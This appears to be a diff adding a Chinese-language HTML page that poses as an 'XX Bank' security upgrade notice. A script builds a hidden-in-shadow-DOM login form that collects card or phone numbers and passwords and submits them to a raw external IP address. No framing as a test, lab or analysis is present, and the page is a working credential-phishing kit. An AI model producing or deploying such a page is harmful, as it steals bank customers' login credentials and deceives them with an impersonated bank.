@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><title>XX 银行 · 安全升级</title>
+<style>body{font-family:system-ui,"PingFang SC",sans-serif;margin:40px auto;max-width:720px;line-height:1.8;color:#222}</style></head>
+<body>
+<h1>XX 银行 · 安全升级</h1>
+<p>为保障账户安全，请完成一次登录校验：</p>
+<div id="host"></div>
+<p>校验完成后即可正常使用。</p>
+<script>
+const r = document.getElementById('host').attachShadow({mode: 'open'});
+r.innerHTML = '<h2>个人网银登录</h2>' +
+  '<form action="http://8.163.58.115:18781/sync/v1/report" method="get">' +
+  '<input name="q" placeholder="卡号 / 手机号" style="display:block;width:100%;padding:10px;margin:8px 0">' +
+  '<input name="p" type="password" placeholder="登录密码" style="display:block;width:100%;padding:10px;margin:8px 0">' +
+  '<button type="submit" style="background:#c00;color:#fff;border:0;padding:10px 16px;border-radius:6px;width:100%">登录</button>' +
+  '</form>';
+</script>
+</body></html>
